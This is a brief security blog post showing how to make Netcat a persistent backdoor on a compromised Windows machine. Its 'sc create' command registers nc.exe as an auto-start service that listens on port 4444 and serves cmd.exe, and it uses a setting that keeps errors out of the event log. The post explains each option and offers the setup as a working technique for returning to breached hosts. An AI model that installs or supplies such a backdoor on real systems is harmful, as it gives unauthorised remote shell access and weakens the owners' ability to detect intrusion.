---
title: 'Netcat as a service'
date: 2019-11-20 23:45
categories: security
tags: netcat hack learn 
featured_image: '/images/posts/netcat.jpg'
lead_text: "Installing netcat as a windows service"
---

Many times I've used Netcat to setup (reverse) shell from a compromised 
machine. Digging into services lately, I thought why not use a service
to make Netcat a persistent to be able to return to the machine.

## Adding the service
Service executables are no regular executables. Upon start, the service
process returns directly after starting, but keeps the process running.

Just using "_nc.exe_" would block the service control and keep the status
"starting...". So we use "_cmd /c start ..._" to return immediately after
spawning the "_nc.exe_" process.

```dos
C:\Windows\system32>sc create NcService binPath= "cmd.exe /c start c:\nc.exe -nLp 4444 -e cmd.exe" start= auto error= ignore
[SC] CreateService SUCCESS

C:\Windows\system32>
```

## Netcat options
Starting netcat with "_c:\nc.exe -nLp 4444 -e cmd.exe_".

The options provided to "_nc.exe_":

  * -n : Numeric ip-address, no DNS
  * -L : Persistent listener, restart listening after disconnect.
  * -p : Specify to listen on port 4444
  * -e : The program to run upon connect.

## Netcat service create options
The options provided to "_sc create_":

  * "start= auto" : Automatically start the service on booting
  * "error= ignore" : Do not log errors to eventlog.
  * "binPath= ..."

## Starting and stopping
Netcat is setup now, but still it is not an actual service.
Netcat will start, but there will be an error:

```dos
C:\>sc start NcService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

C:\>

```

Also the status will not tell whether Netcat is running, neither
will it be possible to stop the service.

To stop Netcat, use taskkill:
```dos
C:\>taskkill /f /im nc.exe
SUCCESS: The process "nc.exe" with PID 5576 has been terminated.

C:\>
```

## Wrap up
Not very pretty, but it works fine for me...
